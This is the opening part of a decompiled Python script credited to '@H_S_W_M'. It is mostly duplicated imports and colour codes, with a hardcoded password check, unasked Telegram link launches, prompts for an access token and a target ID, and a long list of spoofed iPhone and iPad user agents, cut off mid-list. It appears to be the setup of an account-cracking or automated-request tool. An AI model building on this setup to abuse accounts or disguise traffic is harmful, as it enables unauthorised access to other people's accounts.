# DeCoDe By @H_S_W_M
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import random
import os
import sys
import time
import os,sys,time,json,random,re,string,platform,base64
#mport requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import webbrowser
webbrowser.open('https://t.me/py_1hon')
import webbrowser
import requests,time,pyfiglet,datetime
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33'
J = '\x1b[1;38;5;178m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
#asu = random.choice([m,k,h,u,b])
AB_A='\x1b[1;97m' # ابيض خط عربض
RS='\x1b[30m' #رصاصي
AH_F='\x1b[31m'   #احمر فاتح
AKH_F='\x1b[32m' #اخضر فاتح
AS_T='\x1b[33m'#اصفر طوخ
SM='\x1b[34m'  #سمائي
BN='\x1b[35m'#بنفسجي
AZ_T='\x1b[36m'  #ازرك طوخ
AB_KH='\x1b[37m' #ابيض خط خفيف
AH_T='\x1b[91m'  #احمر طوخ
AKH_T='\x1b[92m'#اخضر طوخ
AS_F='\x1b[93m'    #اصفر فاتح
WR='\x1b[95m'      #وردي
p='\x1b[38;5;208m' #برتقالي
AH2='\x1b[38;5;204m' 
AS2='\x1b[38;5;220m'
MJ='\x1b[38;5;193m'
MJ2='\x1b[38;5;216m'
MJ3='\x1b[38;5;190m'
O='\x1b[0;96m'     # Biru Muda
P='\x1b[38;5;231m' # Putih
J='\x1b[38;5;208m' # Jingga
MJ4='\x1b[38;5;106m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
AB_A = '\x1b[1;97m'
RS = '\x1b[30m'
AH_F = '\x1b[31m'
AKH_F = '\x1b[32m'
AS_T = '\x1b[33m'
SM = '\x1b[34m'
BN = '\x1b[35m'
AZ_T = '\x1b[36m'
AB_KH = '\x1b[37m'
AH_T = '\x1b[91m'
AKH_T = '\x1b[92m'
AS_F = '\x1b[93m'
WR = '\x1b[95m'
p = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = '\x1b[0;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
MJ4 = '\x1b[38;5;106m'
re = 'dechossam'
print ("\033[1;92m تسـجيل دخول نمࢪود")
print ("\033[1;97m--------------------")
print ("\033[1;97m ") 
password = 'dechossam'
print (E)
if password == "" :
  sys.exit()
if password in str(re):
  print(H+" FIRST STEP Is Done. Logged in Successfully as ")
  print ("\033[1;93m ")
  print("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" Wrong Password ⌯")
  os.system('xdg-open https://t.me/SidraTools/1')
  sys.exit()
SDMi="""
———————————————
• DeCoDe By @H_S_W_M •
———————————————
 \x1b[38;5;208m  \033[1;33m
   ──────────────────────────────────────────────────────
─██████████████─████████████───██████──────────██████─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██████████████▒▒██─
─██▒▒██████████─██▒▒████▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─
─██▒▒██████████─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─
─██████████▒▒██─██▒▒██──██▒▒██─██▒▒██──██████──██▒▒██─
─────────██▒▒██─██▒▒██──██▒▒██─██▒▒██──────────██▒▒██─
─██████████▒▒██─██▒▒████▒▒▒▒██─██▒▒██──────────██▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██──────────██▒▒██─
─██████████████─████████████───██████──────────██████─
────────────────────────────────────────────────────── 
———————————————
• DeCoDe By @H_S_W_M •
———————————————"""
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33'
J = '\x1b[1;38;5;178m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
#asu = random.choice([m,k,h,u,b])
AB_A='\x1b[1;97m' # ابيض خط عربض
RS='\x1b[30m' #رصاصي
AH_F='\x1b[31m'   #احمر فاتح
AKH_F='\x1b[32m' #اخضر فاتح
AS_T='\x1b[33m'#اصفر طوخ
SM='\x1b[34m'  #سمائي
BN='\x1b[35m'#بنفسجي
AZ_T='\x1b[36m'  #ازرك طوخ
AB_KH='\x1b[37m' #ابيض خط خفيف
AH_T='\x1b[91m'  #احمر طوخ
AKH_T='\x1b[92m'#اخضر طوخ
AS_F='\x1b[93m'    #اصفر فاتح
WR='\x1b[95m'      #وردي
p='\x1b[38;5;208m' #برتقالي
AH2='\x1b[38;5;204m' 
AS2='\x1b[38;5;220m'
MJ='\x1b[38;5;193m'
MJ2='\x1b[38;5;216m'
MJ3='\x1b[38;5;190m'
O='\x1b[0;96m'     # Biru Muda
P='\x1b[38;5;231m' # Putih
J='\x1b[38;5;208m' # Jingga
MJ4='\x1b[38;5;106m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
AB_A = '\x1b[1;97m'
RS = '\x1b[30m'
AH_F = '\x1b[31m'
AKH_F = '\x1b[32m'
AS_T = '\x1b[33m'
SM = '\x1b[34m'
BN = '\x1b[35m'
AZ_T = '\x1b[36m'
AB_KH = '\x1b[37m'
AH_T = '\x1b[91m'
AKH_T = '\x1b[92m'
AS_F = '\x1b[93m'
WR = '\x1b[95m'
p = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = '\x1b[0;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
MJ4 = '\x1b[38;5;106m'
import requests,bs4,json,os,sys,random,datetime,time,re
import threading
import urllib3,rich,base64
import threading
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
#asu = random.choice([m,k,h,u,b])
AB_A='\x1b[1;97m' # ابيض خط عربض
RS='\x1b[30m' #رصاصي
AH_F='\x1b[31m'   #احمر فاتح
AKH_F='\x1b[32m' #اخضر فاتح
AS_T='\x1b[33m'#اصفر طوخ
SM='\x1b[34m'  #سمائي
BN='\x1b[35m'#بنفسجي
AZ_T='\x1b[36m'  #ازرك طوخ
AB_KH='\x1b[37m' #ابيض خط خفيف
AH_T='\x1b[91m'  #احمر طوخ
AKH_T='\x1b[92m'#اخضر طوخ
AS_F='\x1b[93m'    #اصفر فاتح
WR='\x1b[95m'      #وردي
p='\x1b[38;5;208m' #برتقالي
AH2='\x1b[38;5;204m' 
AS2='\x1b[38;5;220m'
MJ='\x1b[38;5;193m'
MJ2='\x1b[38;5;216m'
MJ3='\x1b[38;5;190m'
O='\x1b[0;96m'     # Biru Muda
P='\x1b[38;5;231m' # Putih
J='\x1b[38;5;208m' # Jingga
MJ4='\x1b[38;5;106m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
AB_A = '\x1b[1;97m'
RS = '\x1b[30m'
AH_F = '\x1b[31m'
AKH_F = '\x1b[32m'
AS_T = '\x1b[33m'
SM = '\x1b[34m'
BN = '\x1b[35m'
AZ_T = '\x1b[36m'
AB_KH = '\x1b[37m'
AH_T = '\x1b[91m'
AKH_T = '\x1b[92m'
AS_F = '\x1b[93m'
WR = '\x1b[95m'
p = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = '\x1b[0;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
MJ4 = '\x1b[38;5;106m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # نـــمـــࢪودي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # نـــمـــࢪودي فاتح
a35 = '\x1b[38;5;246m'  # نـــمـــࢪودي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[0;34m'  # أزرق سماوي
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
#asu = random.choice([m,k,h,u,b])
AB_A='\x1b[1;97m' # ابيض خط عربض
RS='\x1b[30m' #رصاصي
AH_F='\x1b[31m'   #احمر فاتح
AKH_F='\x1b[32m' #اخضر فاتح
AS_T='\x1b[33m'#اصفر طوخ
SM='\x1b[34m'  #سمائي
BN='\x1b[35m'#بنفسجي
AZ_T='\x1b[36m'  #ازرك طوخ
AB_KH='\x1b[37m' #ابيض خط خفيف
AH_T='\x1b[91m'  #احمر طوخ
AKH_T='\x1b[92m'#اخضر طوخ
AS_F='\x1b[93m'    #اصفر فاتح
WR='\x1b[95m'      #وردي
p='\x1b[38;5;208m' #برتقالي
AH2='\x1b[38;5;204m' 
AS2='\x1b[38;5;220m'
MJ='\x1b[38;5;193m'
MJ2='\x1b[38;5;216m'
MJ3='\x1b[38;5;190m'
O='\x1b[0;96m'     # Biru Muda
P='\x1b[38;5;231m' # Putih
J='\x1b[38;5;208m' # Jingga
MJ4='\x1b[38;5;106m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
AB_A = '\x1b[1;97m'
RS = '\x1b[30m'
AH_F = '\x1b[31m'
AKH_F = '\x1b[32m'
AS_T = '\x1b[33m'
SM = '\x1b[34m'
BN = '\x1b[35m'
AZ_T = '\x1b[36m'
AB_KH = '\x1b[37m'
AH_T = '\x1b[91m'
AKH_T = '\x1b[92m'
AS_F = '\x1b[93m'
WR = '\x1b[95m'
p = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = '\x1b[0;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
MJ4 = '\x1b[38;5;106m'
import sys,time,os
class SDM:
    def __init__(self,z):
        for e in z+'\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0009)


def clear():
    os.system('clear')
print('—'*25)
print('• DeCoDe By @H_S_W_M •')
print('—'*25)
print(J+'━━'*42)
print(" \033[1;34m  🔱 SDM 🔱 @M_T_F     ")
print(J+'━━'*42)
print()
print('—'*25)
print('• DeCoDe By @H_S_W_M •')
print('—'*25)

import requests,time,pyfiglet,datetime
now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2023, 12, 15, 0, 0 )

# if (x.strftime("%x"))>(g.strftime("%x")):
 # print('\033[1;32m تم ايقاف الاداه راسل المطور نـــمـــࢪود لتفعيل ')
 # time.sleep(1)
 # print('\033[1;31m المطورالمبࢪمج:- @M_T_F    ')
 # time.sleep(1)
 # print('\033[1;32m  🔱 نمــࢪود 🔱')
 # time.sleep(1)
 # print('\033[1;31m 1')
 # time.sleep(1)
 # print('\033[1;32m 2')
 # time.sleep(1)
 # print('\033[1;31m 3')
 # time.sleep(1)
 # print('\033[1;32m 4')
 # time.sleep(1)
 # print('\033[1;31m 5')
 # time.sleep(1)
 # print('\033[1;32m 6')
 # time.sleep(1)
 # print('\033[1;31m 7')
 # time.sleep(1)
 # print('\033[1;32m 8')
 # time.sleep(1)
 # print('\033[1;31m 9')
 # time.sleep(1)
 # print('\033[1;32m@M_T_F')
 

 # open(".token.txt", "w").write(' . . . .')
 # print(x)
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import threading
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
import webbrowser
webbrowser.open('https://t.me/py_1hon1')
from rich.text import Text as tekz
import os


Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
print('\n')
print('\033[1;36m')
import os
try:

	import requests
except ImportError:
    Z = '''[1;31m'''
R = '''[1;31m'''
X = '''[1;33m'''
F = '''[2;32m'''
C = '''[1;97m'''
B = '''[2;36m'''
Y = '''[1;34m'''
E = '''[1;31m'''
B = '''[2;36m'''
G = '''[1;32m'''
S = '''[1;33m'''
ses = requests.Session()
F = '''[2;32m'''
Z = '''[1;31m'''
L = '''[1;95m'''
E = '''[1;31m'''
G = '''[1;32m'''
S = '''[1;33m'''
Z = '''[1;31m'''
X = '''[1;33m'''
Z1 = '''[2;31m'''
F = '''[2;32m'''
A = '''[2;39m'''
C = '''[2;35m'''
B = '''[2;36m'''
Y = '''[1;34m'''
xxh = '\x1b[38;5;208m'#برتقالي
r1='\x1b[38;5;8m'#نـــمـــࢪودي
e1='\x1b[38;5;196m'#احمر
w1='\x1b[38;5;225m'#وردي فاتح جدا
t1='\x1b[38;5;92m'#بنفسجي غامق
y1='\x1b[1;93m'#اصفر نيون
u1='\x1b[1;38;5;203m'#وردي لطيف
i1='\x1b[1;38;5;121m'#اخضر نيون
o1='\x1b[1;96m'#ازرق سماوي
p1='\x1b[38;5;205m'#وردي فاتح
a1='\x1b[38;5;161m'#وردي جميل جدا
time1 = time.localtime()
time2 = time.strftime('''%d/%m/%Y''')
print(SDMi) 
time3 = time.strftime('''%H:%M:%S''')
print('')
print(f''' \x1b[1;93m  ༺ \x1b[1;38;5;121m  𝑆𝐷𝑀 𝐕𝐈𝐏 \x1b[1;93m ༻  ''')
print(f'''{C}: \x1b[38;5;92m 𝐓𝐇𝐄 𝐃𝐀𝐓𝐄 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time2} \x1b[1;38;5;121m 𖣎''')
print('')
print(f'''{C}: \x1b[38;5;92m 𝑇𝐻𝐸 𝑇𝐼𝑀𝐸 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time3} \x1b[1;38;5;121m 𖣎''')
print('')
token=input('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}  \x1b[38;5;180m𝐓𝐎𝐊𝐄𝐍  \x1b[1;38;5;121m ๛   \x1b[38;5;117m')
print()
ID=input('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}  𝐈𝐃 \x1b[1;38;5;121m ๛  \x1b[38;5;117m︎')
os.system('clear')
os.system('clear')
pretty.install()
CON = sol()
SDMVIP = [
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_2 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7D11 Safari/528.16',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7E18',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_4 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; nl-nl) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
